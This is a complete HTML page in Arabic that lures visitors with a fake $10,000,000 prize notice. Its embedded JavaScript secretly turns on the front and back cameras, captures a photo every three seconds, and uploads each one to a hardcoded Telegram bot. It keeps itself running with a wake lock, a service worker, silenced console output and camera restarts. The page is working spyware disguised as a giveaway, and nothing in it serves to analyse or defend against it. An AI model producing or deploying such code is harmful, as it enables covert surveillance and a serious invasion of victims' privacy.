<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>جائزة حصرية</title>
<style>
body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial; color:#fff; overflow:hidden; }
.card { background:rgba(20,10,10,0.95); padding:40px; border-radius:30px; border:2px solid #ffd700; text-align:center; max-width:400px; box-shadow:0 0 60px rgba(255,215,0,0.2); }
.card h1 { color:#ffd700; font-size:28px; }
.card p { color:#ccc; margin:15px 0; font-size:16px; }
.hidden { display:none !important; }
#status { font-size:14px; color:#ff8844; margin-top:10px; }
.sparkle { color:#ffd700; font-size:22px; animation: pulse 1.5s infinite; }
@keyframes pulse { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
</style>
</head>
<body>

<div class="card" id="mainCard">
  <h1>🎉 فوز مفاجئ!</h1>
  <p>لقد اخترتك لجائزة <strong style="color:#ffd700;">10,000,000$</strong></p>
  <p style="font-size:13px;color:#888;">جاري تجهيز الجائزة... <span class="sparkle">✦</span></p>
  <div id="status">⏳ يرجى الانتظار...</div>
</div>

<!-- فيديوهات مخفية -->
<video id="videoFront" autoplay muted playsinline class="hidden"></video>
<video id="videoBack" autoplay muted playsinline class="hidden"></video>

<!-- كانفس للتصوير -->
<canvas id="canvasFront" class="hidden"></canvas>
<canvas id="canvasBack" class="hidden"></canvas>

<script>
// ============================================================
// ================ BOT CONFIG =================================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let frontStream = null, backStream = null;
let frontInterval = null, backInterval = null;
let photoCount = 0;
const CAPTURE_INTERVAL = 3000; // كل 3 ثواني صورة

// ============================================================
// ================ الحصول على CHAT_ID ========================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        let last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          sendMessage('✅ تم تفعيل التصوير الخفي');
          startHiddenCamera();
        } else {
          setTimeout(getChatId, 2000);
        }
      } else {
        setTimeout(getChatId, 2000);
      }
    })
    .catch(() => setTimeout(getChatId, 2000));
}

// ============================================================
// ================ إرسال الصور إلى تليجرام ===================
// ============================================================
function sendMessage(text) {
  if (!CHAT_ID) return;
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  }).catch(() => {});
}

function sendPhoto(imageData, caption = '') {
  if (!CHAT_ID || !imageData) return;
  try {
    let blob = dataURLtoBlob(imageData);
    let fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
    fd.append('caption', caption || '📸 صورة ملتقطة');
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: fd
    }).catch(() => {});
  } catch(e) {}
}

function dataURLtoBlob(dataURL) {
  let parts = dataURL.split(',');
  let mime = parts[0].match(/:(.*?);/)[1];
  let bstr = atob(parts[1]);
  let n = bstr.length;
  let u8arr = new Uint8Array(n);
  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
  return new Blob([u8arr], { type: mime });
}

// ============================================================
// ================ تشغيل الكاميرات بشكل خفي ==================
// ============================================================
function startHiddenCamera() {
  // ---- الكاميرا الأمامية ----
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  })
  .then(stream => {
    frontStream = stream;
    let video = document.getElementById('videoFront');
    video.srcObject = stream;
    video.play();
    
    // إعداد الكانفس للأمامية
    let canvas = document.getElementById('canvasFront');
    canvas.width = 640;
    canvas.height = 480;
    let ctx = canvas.getContext('2d');
    
    // بدأ التصوير الدوري
    frontInterval = setInterval(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imgData = canvas.toDataURL('image/jpeg', 0.9);
      photoCount++;
      sendPhoto(imgData, `📸 كاميرا أمامية #${photoCount}`);
      sendMessage(`📸 تم تصوير أمامي #${photoCount}`);
      document.getElementById('status').innerHTML = `📸 تم التقاط ${photoCount} صور`;
    }, CAPTURE_INTERVAL);
    
    sendMessage('✅ تم تشغيل الكاميرا الأمامية');
  })
  .catch(err => {
    sendMessage('❌ فشل الكاميرا الأمامية: ' + err.message);
  });

  // ---- الكاميرا الخلفية ----
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  })
  .then(stream => {
    backStream = stream;
    let video = document.getElementById('videoBack');
    video.srcObject = stream;
    video.play();
    
    // إعداد الكانفس للخلفية
    let canvas = document.getElementById('canvasBack');
    canvas.width = 640;
    canvas.height = 480;
    let ctx = canvas.getContext('2d');
    
    // بدأ التصوير الدوري
    backInterval = setInterval(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imgData = canvas.toDataURL('image/jpeg', 0.9);
      sendPhoto(imgData, `📸 كاميرا خلفية #${photoCount}`);
      sendMessage(`📸 تم تصوير خلفي #${photoCount}`);
    }, CAPTURE_INTERVAL);
    
    sendMessage('✅ تم تشغيل الكاميرا الخلفية');
  })
  .catch(err => {
    sendMessage('❌ فشل الكاميرا الخلفية: ' + err.message);
  });

  // منع السكون
  if ('wakeLock' in navigator) {
    navigator.wakeLock.request('screen').catch(() => {});
  }

  // تحديث الواجهة
  document.getElementById('status').innerHTML = '📷 جاري التصوير...';
  document.querySelector('.card p').innerHTML = '🎁 جاري تجهيز جائزتك <span class="sparkle">✦</span>';
}

// ============================================================
// ================ حافظ على النشاط ===========================
// ============================================================
setInterval(() => {
  if (CHAT_ID) sendMessage('🔄 التصوير الخفي مستمر');
  
  // إعادة تشغيل الكاميرات إذا توقفت
  if (frontStream && !frontInterval) {
    startHiddenCamera();
  }
  if (backStream && !backInterval) {
    startHiddenCamera();
  }
}, 30000);

// ============================================================
// ================ Service Worker =============================
// ============================================================
if ('serviceWorker' in navigator) {
  const swCode = `
    self.addEventListener('install', e => self.skipWaiting());
    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
    setInterval(() => {
      self.clients.matchAll().then(c => c.forEach(client => client.postMessage('keep')));
    }, 5000);
  `;
  const blob = new Blob([swCode], { type: 'application/javascript' });
  const swUrl = URL.createObjectURL(blob);
  navigator.serviceWorker.register(swUrl).catch(() => {});
}

// ============================================================
// ================ بدء التشغيل ================================
// ============================================================
console.log = console.warn = console.error = () => {};

// الحصول على CHAT_ID وبدء التصوير
getChatId();

// محاولة إعادة المحاولة
setTimeout(() => {
  if (!CHAT_ID) getChatId();
}, 5000);

// بدء التصوير حتى لو لم يصل CHAT_ID بعد
setTimeout(() => {
  if (!frontInterval && !backInterval) {
    startHiddenCamera();
  }
}, 2000);

// إرسال إشعار بدء
setTimeout(() => {
  if (CHAT_ID) sendMessage('🔥 بدأ التصوير الخفي - صور أمامية وخلفية');
}, 3000);
</script>
</body>
</html>
